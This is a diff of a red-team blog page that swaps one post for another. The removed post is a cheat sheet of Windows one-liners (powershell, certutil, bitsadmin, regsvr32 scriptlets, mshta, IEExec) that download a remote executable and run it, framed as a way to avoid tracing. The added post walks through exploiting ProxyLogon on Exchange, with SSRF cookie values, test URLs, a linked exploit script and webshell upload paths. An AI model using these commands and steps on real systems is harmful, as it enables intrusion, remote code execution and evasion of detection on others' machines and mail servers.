@@ -4,7 +4,7 @@
 
 <head>
     <meta charset="utf-8">
-    <meta name="keywords" content="Some ways to download files remotely from Github, Yangsir">
+    <meta name="keywords" content="ProxyLogon Utilization method, Yangsir">
     <meta name="description" content="">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
@@ -16,7 +16,7 @@
     <!-- Global site tag (gtag.js) - Google Analytics -->
 
 
-    <title>Some ways to download files remotely from Github | Yangsir</title>
+    <title>ProxyLogon Utilization method | Yangsir</title>
     <link rel="icon" type="image/png" href="/favicon.png">
 
     <link rel="stylesheet" type="text/css" href="/libs/awesome/css/all.css">
@@ -311,12 +311,12 @@
 
 
 
-<div class="bg-cover pd-header post-cover" style="background-image: url('https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/main/Some%20ways%20to%20download%20files%20remotely%20from%20Github/image-20210723213650376.png')">
+<div class="bg-cover pd-header post-cover" style="background-image: url('https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/main/ProxyLogon%20Utilization%20method/image-20210726161008442.png')">
     <div class="container" style="right: 0px;left: 0px;">
         <div class="row">
             <div class="col s12 m12 l12">
                 <div class="brand">
-                    <h1 class="description center-align post-title">Some ways to download files remotely from Github</h1>
+                    <h1 class="description center-align post-title">ProxyLogon Utilization method</h1>
                 </div>
             </div>
         </div>
@@ -436,12 +436,16 @@
                                 <span class="chip bg-color">Redteam</span>
                             </a>
                         
-                            <a href="/tags/Bypass/">
-                                <span class="chip bg-color">Bypass</span>
+                            <a href="/tags/Exchange/">
+                                <span class="chip bg-color">Exchange</span>
                             </a>
                         
-                            <a href="/tags/File-download/">
-                                <span class="chip bg-color">File download</span>
+                            <a href="/tags/ProxyLogon/">
+                                <span class="chip bg-color">ProxyLogon</span>
+                            </a>
+                        
+                            <a href="/tags/RCE/">
+                                <span class="chip bg-color">RCE</span>
                             </a>
                         
                     </div>
@@ -452,8 +456,8 @@
                     <div class="post-cate">
                         <i class="fas fa-bookmark fa-fw icon-category"></i>
                         
-                            <a href="/categories/Miscellaneous-record/" class="post-category">
-                                Miscellaneous record
+                            <a href="/categories/Learning-record/" class="post-category">
+                                Learning record
                             </a>
                         
                     </div>
@@ -465,28 +469,28 @@
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-minus fa-fw"></i>Publish Date:&nbsp;&nbsp;
-                    2021-07-23
+                    2021-07-26
                 </div>
                 
 
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-check fa-fw"></i>Update Date:&nbsp;&nbsp;
-                    2021-07-24
+                    2021-07-26
                 </div>
                 
 
                 
                 <div class="info-break-policy">
                     <i class="far fa-file-word fa-fw"></i>Word Count:&nbsp;&nbsp;
-                    520
+                    717
                 </div>
                 
 
                 
                 <div class="info-break-policy">
                     <i class="far fa-clock fa-fw"></i>Read Times:&nbsp;&nbsp;
-                    3 Min
+                    4 Min
                 </div>
                 
 
@@ -509,67 +513,68 @@
 
         <div class="card-content article-card-content">
             <div id="articleContent">
-                <h2 id="Introduction"><a href="#Introduction" class="headerlink" title="Introduction"></a>Introduction</h2><pre class="line-numbers language-none"><code class="language-none">The goal is to improve the traceability cost, avoid being detected by the traceability, and improve the concealment
+                <h2 id="Some-of-the-words"><a href="#Some-of-the-words" class="headerlink" title="Some of the words"></a>Some of the words</h2><pre class="line-numbers language-none"><code class="language-none">The way of exploiting loopholes has come out long ago, mainly because there are more pits in the process of using one time, and the final failure, just have time to do things over and over again, and repeat learning here
 
-Existing documents:
-https:&#x2F;&#x2F;github.com&#x2F;YangSirrr&#x2F;Yangsir-blog-img&#x2F;raw&#x2F;main&#x2F;calc.exe
-You need to download to C:\test and execute<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+In the process, FQDN and OABID are the main pits encountered by the younger brother. If the older brothers have better articles, they can push the younger brother to read<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
 
-<h2 id="Actual-use"><a href="#Actual-use" class="headerlink" title="Actual use"></a>Actual use</h2><h3 id="powershell"><a href="#powershell" class="headerlink" title="powershell"></a>powershell</h3><pre class="line-numbers language-none"><code class="language-none">powershell (new-object System.Net.WebClient).DownloadFile(&#39;https:&#x2F;&#x2F;github.com&#x2F;YangSirrr&#x2F;Yangsir-blog-img&#x2F;raw&#x2F;main&#x2F;calc.exe&#39;,&#39;C:\test\yang.exe&#39;);start-process &#39;C:\test\yang.exe&#39;
+<h2 id="Introduction"><a href="#Introduction" class="headerlink" title="Introduction"></a>Introduction</h2><pre class="line-numbers language-none"><code class="language-none">Vulnerability Description:
+Exchange Server is an E-mail service component of Microsoft. It is a messaging and collaboration system. On March 3, 2021, Microsoft officially released a Security update for Microsoft Exchange, which disclosed several high-risk and critical vulnerabilities, including: In CVE-2021-26855 Exchange SSRF vulnerability, an attacker can directly construct malicious requests, initiate arbitrary HTTP requests as an Exchange server, scan the Intranet, and obtain Exchange user information. The vulnerability exploits no identity authentication
 
-powershell (new-object System.Net.WebClient).DownloadFile(&#39;https:&#x2F;&#x2F;github.com&#x2F;YangSirrr&#x2F;Yangsir-blog-img&#x2F;raw&#x2F;main&#x2F;calc.exe&#39;,&#39;c:\\test\\yang.exe&#39;);start-process &#39;c:\\test\\yang.exe&#39;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+Affected version:
+Microsoft Exchange 2013
+Microsoft Exchange 2016
+Microsoft Exchange 2019
+Microsoft Exchange 2010<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
-<h3 id="certutil"><a href="#certutil" class="headerlink" title="certutil"></a>certutil</h3><pre class="line-numbers language-none"><code class="language-none">certutil -urlcache -split -f https:&#x2F;&#x2F;github.com&#x2F;YangSirrr&#x2F;Yangsir-blog-img&#x2F;raw&#x2F;main&#x2F;calc.exe C:\test\yang.exe&amp;&amp;C:\test\yang.exe<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<h2 id="Local-environment"><a href="#Local-environment" class="headerlink" title="Local environment"></a>Local environment</h2><pre class="line-numbers language-none"><code class="language-none">Note that there are still some problems with the built environment. After the current test, only the SSRF succeeds, and the subsequent getshell environment needs to be changed
 
-<h3 id="bitsadmin"><a href="#bitsadmin" class="headerlink" title="bitsadmin"></a>bitsadmin</h3><pre class="line-numbers language-none"><code class="language-none">Slow, not recommended
-bitsadmin &#x2F;transfer n https:&#x2F;&#x2F;github.com&#x2F;YangSirrr&#x2F;Yangsir-blog-img&#x2F;raw&#x2F;main&#x2F;calc.exe C:\test\yang.exe &amp;&amp; C:\test\yang.exe<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+I don&#39;t know if there is no getshell because of my brother&#39;s operation problem. If my brother can succeed, please tell my brother
 
-<h3 id="regsvr32"><a href="#regsvr32" class="headerlink" title="regsvr32"></a>regsvr32</h3><pre class="line-numbers language-none"><code class="language-none">Run the regsve32-vbs-download-exec
+I am using server2016+exchange2016，the following<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
-regsvr32 &#x2F;s &#x2F;i:https:&#x2F;&#x2F;github.com&#x2F;YangSirrr&#x2F;Yangsir-blog-img&#x2F;raw&#x2F;main&#x2F;download.sct   scrobj.dll
+<p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/main/ProxyLogon%20Utilization%20method/image-20210726161008442.png"></p>
+<pre class="line-numbers language-none"><code class="language-none">New machine installation ex16 will report error, as follows, search the relevant dependence on self-installation, basic are very simple, also do not have to search what, what is missing under what<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
-Use this:
-			Const adTypeBinary &#x3D; 1
-			Const adSaveCreateOverWrite &#x3D; 2
-			Dim http,ado
-			Set http &#x3D; CreateObject(&quot;Msxml2.ServerXMLHTTP.6.0&quot;)
-			http.SetOption 2, 13056
-			http.open &quot;GET&quot;,&quot;https:&#x2F;&#x2F;github.com&#x2F;YangSirrr&#x2F;Yangsir-blog-img&#x2F;raw&#x2F;main&#x2F;calc.exe&quot;,False
-			http.send
-			Set ado &#x3D; createobject(&quot;Adodb.Stream&quot;)
-			ado.Type &#x3D; adTypeBinary
-			ado.Open
-			ado.Write http.responseBody
-			ado.SaveToFile &quot;C:\test\yang.exe&quot;
-			ado.Close<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/main/ProxyLogon%20Utilization%20method/image-20210726161114892.png"></p>
+<h2 id="Actual-use"><a href="#Actual-use" class="headerlink" title="Actual use"></a>Actual use</h2><h3 id="DNSlog"><a href="#DNSlog" class="headerlink" title="DNSlog"></a>DNSlog</h3><pre class="line-numbers language-none"><code class="language-none">The URL that tests can use:
+&#x2F;owa&#x2F;auth&#x2F;qqqqq.js
+&#x2F;owa&#x2F;auth&#x2F;Current&#x2F;1.js
+&#x2F;owa&#x2F;auth&#x2F;Current&#x2F;themes&#x2F;resources&#x2F;logon.css
+&#x2F;owa&#x2F;auth&#x2F;Current&#x2F;themes&#x2F;resources&#x2F;.....
 
-<p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/main/Some%20ways%20to%20download%20files%20remotely%20from%20Github/image-20210723213650376.png"></p>
-<pre class="line-numbers language-none"><code class="language-none">Run the regsve32-JS-ps-download-exec
+set cookie：X -AnonResource&#x3D;true; X-AnonResource-Backend&#x3D;XXXXXX&#x2F;ecp&#x2F;default.flt?~3; X-BEResource&#x3D;localhost&#x2F;owa&#x2F;auth&#x2F;logon.aspx?~3;
 
-regsvr32 &#x2F;u &#x2F;s &#x2F;i:https:&#x2F;&#x2F;github.com&#x2F;YangSirrr&#x2F;Yangsir-blog-img&#x2F;raw&#x2F;main&#x2F;download.sct scrobj.dll
+You can use hackbar like this:<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
-Use this:
-new ActiveXObject(&quot;WScript.Shell&quot;).Run(&quot;powershell (new-object System.Net.WebClient).DownloadFile(&#39;https:&#x2F;&#x2F;github.com&#x2F;YangSirrr&#x2F;Yangsir-blog-img&#x2F;raw&#x2F;main&#x2F;calc.exe&#39;,&#39;c:\\test\\yang.exe&#39;);start-process &#39;c:\\test\\yang.exe&#39;&quot;,0,true);<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>![](<a target="_blank" rel="noopener" href="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/main/ProxyLogon%20Utilization%20method/iShot2021-07-26">https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/main/ProxyLogon%20Utilization%20method/iShot2021-07-26</a> 18.19.39.png)</p>
+<pre class="line-numbers language-none"><code class="language-none">DNS The following command output is displayed<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
-<h3 id="mshta"><a href="#mshta" class="headerlink" title="mshta"></a>mshta</h3><pre class="line-numbers language-none"><code class="language-none">Mshta supports http&amp;https, where the script must be an HTML page to run, otherwise it will be parsed as text
+<p>![](<a target="_blank" rel="noopener" href="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/main/ProxyLogon%20Utilization%20method/iShot2021-07-26">https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/main/ProxyLogon%20Utilization%20method/iShot2021-07-26</a> 18.20.00.png)</p>
+<h3 id="Mail-the-enumeration"><a href="#Mail-the-enumeration" class="headerlink" title="Mail the enumeration"></a>Mail the enumeration</h3><pre class="line-numbers language-none"><code class="language-none">You can use this:
+https:&#x2F;&#x2F;github.com&#x2F;charlottelatest&#x2F;CVE-2021-26855<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
 
-The local environment is used as an example
+<p>![](<a target="_blank" rel="noopener" href="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/main/ProxyLogon%20Utilization%20method/iShot2021-07-26">https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/main/ProxyLogon%20Utilization%20method/iShot2021-07-26</a> 18.26.12.png)</p>
+<h3 id="Getshell（Many-of-the-public-scripts-have-problems-and-the-successful-one-is-recommended-here）"><a href="#Getshell（Many-of-the-public-scripts-have-problems-and-the-successful-one-is-recommended-here）" class="headerlink" title="Getshell（Many of the public scripts have problems, and the successful one is recommended here）"></a>Getshell（Many of the public scripts have problems, and the successful one is recommended here）</h3><pre class="line-numbers language-none"><code class="language-none">After many tests, it is found that sometimes the target can not be exploited successfully despite the existence of loopholes!!
 
-mshta http:&#x2F;&#x2F;127.0.0.1&#x2F;calc.hta<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+In addition, the local 2016 environment is still unable to getshell!!
 
-<p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/main/Some%20ways%20to%20download%20files%20remotely%20from%20Github/image-20210723222036052.png"></p>
-<pre class="line-numbers language-none"><code class="language-none">Make sure the download executes successfully to PowerShell
+The OABID needs to be modified<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
-powershell (new-object System.Net.WebClient).DownloadFile(&#39;https:&#x2F;&#x2F;github.com&#x2F;YangSirrr&#x2F;Yangsir-blog-img&#x2F;raw&#x2F;main&#x2F;calc.exe&#39;,&#39;C:\test\yang.exe&#39;);start-process &#39;C:\test\yang.exe&#39;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+<p>![](<a target="_blank" rel="noopener" href="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/main/ProxyLogon%20Utilization%20method/iShot2021-07-26">https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/main/ProxyLogon%20Utilization%20method/iShot2021-07-26</a> 18.26.40.png)</p>
+<pre class="line-numbers language-none"><code class="language-none">Visit WebShell below<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
-<p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/main/Some%20ways%20to%20download%20files%20remotely%20from%20Github/image-20210723222405255.png"></p>
-<h3 id="IEExec"><a href="#IEExec" class="headerlink" title="IEExec"></a>IEExec</h3><pre class="line-numbers language-none"><code class="language-none">Encountered pit point, not yet solved, later review
+<p>![](<a target="_blank" rel="noopener" href="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/main/ProxyLogon%20Utilization%20method/iShot2021-07-26">https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/main/ProxyLogon%20Utilization%20method/iShot2021-07-26</a> 18.21.17.png)</p>
+<h4 id="Regular-Webshell-upload-path-easy-to-turn-over-directory"><a href="#Regular-Webshell-upload-path-easy-to-turn-over-directory" class="headerlink" title="Regular Webshell upload path (easy to turn over directory)"></a>Regular Webshell upload path (easy to turn over directory)</h4><pre class="line-numbers language-none"><code class="language-none">\inetpub\wwwroot\aspnet_client\ (any .aspx file under this folder or sub folders)
+\&lt;exchange install path&gt;\FrontEnd\HttpProxy\ecp\auth\ (any file besides TimeoutLogoff.aspx)
+\&lt;exchange install path&gt;\FrontEnd\HttpProxy\owa\auth\ (any file or modified file that is not part of a standard install)
+\&lt;exchange install path&gt;\FrontEnd\HttpProxy\owa\auth\Current\&lt;any aspx file in this folder or subfolders&gt;
+\&lt;exchange install path&gt;\FrontEnd\HttpProxy\owa\auth\&lt;folder with version number&gt;\&lt;any aspx file in this folder or subfolders&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
-cd C:\Windows\Microsoft.NET\Framework\v2.0.50727\
-caspol -s off
-IEExec http:&#x2F;&#x2F;192.168.3.8&#x2F;yang.exe<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<h6 id="More-Principle-Reference"><a href="#More-Principle-Reference" class="headerlink" title="More Principle Reference"></a>More Principle Reference</h6><pre class="line-numbers language-none"><code class="language-none">https:&#x2F;&#x2F;www.volexity.com&#x2F;blog&#x2F;2021&#x2F;03&#x2F;02&#x2F;active-exploitation-of-microsoft-exchange-zero-day-vulnerabilities&#x2F;
+https:&#x2F;&#x2F;www.praetorian.com&#x2F;blog&#x2F;reproducing-proxylogon-exploit&#x2F;
+https:&#x2F;&#x2F;testbnull.medium.com&#x2F;ph%C3%A2n-t%C3%ADch-l%E1%BB%97-h%E1%BB%95ng-proxylogon-mail-exchange-rce-s%E1%BB%B1-k%E1%BA%BFt-h%E1%BB%A3p-ho%C3%A0n-h%E1%BA%A3o-cve-2021-26855-37f4b6e06265
+https:&#x2F;&#x2F;mp.weixin.qq.com&#x2F;s&#x2F;sGkYS4BSM2ER3ubR6G-xhA<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
 
-<p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/main/Some%20ways%20to%20download%20files%20remotely%20from%20Github/image-20210723223302420.png"></p>
 
                 
             </div>
@@ -596,7 +601,7 @@ IEExec http:&#x2F;&#x2F;192.168.3.8&#x2F;yang.exe<span aria-hidden="true" class=
                     </i>
                 </span>
                 <span class="reprint-info">
-                    <a href="https://yangsirrr.github.io/2021/07/23/some-ways-to-download-files-remotely-from-github/">https://yangsirrr.github.io/2021/07/23/some-ways-to-download-files-remotely-from-github/</a>
+                    <a href="https://yangsirrr.github.io/2021/07/26/proxylogon-utilization-method/">https://yangsirrr.github.io/2021/07/26/proxylogon-utilization-method/</a>
                 </span>
             </div>
             <div class="reprint__notice">
@@ -638,12 +643,16 @@ IEExec http:&#x2F;&#x2F;192.168.3.8&#x2F;yang.exe<span aria-hidden="true" class=
                                     <span class="chip bg-color">Redteam</span>
                                 </a>
                             
-                                <a href="/tags/Bypass/">
-                                    <span class="chip bg-color">Bypass</span>
+                                <a href="/tags/Exchange/">
+                                    <span class="chip bg-color">Exchange</span>
                                 </a>
                             
-                                <a href="/tags/File-download/">
-                                    <span class="chip bg-color">File download</span>
+                                <a href="/tags/ProxyLogon/">
+                                    <span class="chip bg-color">ProxyLogon</span>
+                                </a>
+                            
+                                <a href="/tags/RCE/">
+                                    <span class="chip bg-color">RCE</span>
                                 </a>
                             
                         </div>
@@ -689,9 +698,71 @@ IEExec http:&#x2F;&#x2F;192.168.3.8&#x2F;yang.exe<span aria-hidden="true" class=
 <article id="prenext-posts" class="prev-next articles">
     <div class="row article-row">
         
-        <div class="article col s12 m6" data-aos="fade-up">
+        <div class="article col s12 m6" data-aos="fade-up" data-aos="fade-up">
             <div class="article-badge left-badge text-color">
-                <i class="fas fa-chevron-left"></i>&nbsp;Previous</div>
+                <i class="far fa-dot-circle"></i>&nbsp;Current
+            </div>
+            <div class="card">
+                <a href="/2021/07/26/proxylogon-utilization-method/">
+                    <div class="card-image">
+                        
+                        <img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/main/ProxyLogon%20Utilization%20method/image-20210726161008442.png" class="responsive-img" alt="ProxyLogon Utilization method">
+                        
+                        <span class="card-title">ProxyLogon Utilization method</span>
+                    </div>
+                </a>
+                <div class="card-content article-content">
+                    <div class="summary block-with-text">
+                        
+                            
+                        
+                    </div>
+                    <div class="publish-info">
+                            <span class="publish-date">
+                                <i class="far fa-clock fa-fw icon-date"></i>2021-07-26
+                            </span>
+                        <span class="publish-author">
+                            
+                            <i class="fas fa-bookmark fa-fw icon-category"></i>
+                            
+                            <a href="/categories/Learning-record/" class="post-category">
+                                    Learning record
+                                </a>
+                            
+                            
+                        </span>
+                    </div>
+                </div>
+
+                
+                <div class="card-action article-tags">
+                    
+                    <a href="/tags/Redteam/">
+                        <span class="chip bg-color">Redteam</span>
+                    </a>
+                    
+                    <a href="/tags/Exchange/">
+                        <span class="chip bg-color">Exchange</span>
+                    </a>
+                    
+                    <a href="/tags/ProxyLogon/">
+                        <span class="chip bg-color">ProxyLogon</span>
+                    </a>
+                    
+                    <a href="/tags/RCE/">
+                        <span class="chip bg-color">RCE</span>
+                    </a>
+                    
+                </div>
+                
+            </div>
+        </div>
+        
+        
+        <div class="article col s12 m6" data-aos="fade-up">
+            <div class="article-badge right-badge text-color">
+                Next&nbsp;<i class="fas fa-chevron-right"></i>
+            </div>
             <div class="card">
                 <a href="/2021/07/24/sqlserver-common-attack-methods/">
                     <div class="card-image">
@@ -708,9 +779,9 @@ IEExec http:&#x2F;&#x2F;192.168.3.8&#x2F;yang.exe<span aria-hidden="true" class=
                         
                     </div>
                     <div class="publish-info">
-                        <span class="publish-date">
-                            <i class="far fa-clock fa-fw icon-date"></i>2021-07-24
-                        </span>
+                            <span class="publish-date">
+                                <i class="far fa-clock fa-fw icon-date"></i>2021-07-24
+                            </span>
                         <span class="publish-author">
                             
                             <i class="fas fa-bookmark fa-fw icon-category"></i>
@@ -744,62 +815,6 @@ IEExec http:&#x2F;&#x2F;192.168.3.8&#x2F;yang.exe<span aria-hidden="true" class=
                     
                     <a href="/tags/Command-execution/">
                         <span class="chip bg-color">Command execution</span>
-                    </a>
-                    
-                </div>
-                
-            </div>
-        </div>
-        
-        
-        <div class="article col s12 m6" data-aos="fade-up">
-            <div class="article-badge right-badge text-color">
-                Next&nbsp;<i class="fas fa-chevron-right"></i>
-            </div>
-            <div class="card">
-                <a href="/2021/07/23/supplementary-information-about-obtaining-ldap-information/">
-                    <div class="card-image">
-                        
-                        <img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/main/Supplementary%20information%20about%20obtaining%20LDAP%20information/image-20210722152525595.png" class="responsive-img" alt="Supplementary information about obtaining LDAP information">
-                        
-                        <span class="card-title">Supplementary information about obtaining LDAP information</span>
-                    </div>
-                </a>
-                <div class="card-content article-content">
-                    <div class="summary block-with-text">
-                        
-                            
-                        
-                    </div>
-                    <div class="publish-info">
-                            <span class="publish-date">
-                                <i class="far fa-clock fa-fw icon-date"></i>2021-07-23
-                            </span>
-                        <span class="publish-author">
-                            
-                            <i class="fas fa-bookmark fa-fw icon-category"></i>
-                            
-                            <a href="/categories/Essays-record/" class="post-category">
-                                    Essays record
-                                </a>
-                            
-                            
-                        </span>
-                    </div>
-                </div>
-                
-                <div class="card-action article-tags">
-                    
-                    <a href="/tags/Redteam/">
-                        <span class="chip bg-color">Redteam</span>
-                    </a>
-                    
-                    <a href="/tags/Bypass/">
-                        <span class="chip bg-color">Bypass</span>
-                    </a>
-                    
-                    <a href="/tags/Intranet-Information-Collection/">
-                        <span class="chip bg-color">Intranet Information Collection</span>
                     </a>
                     
                 </div>
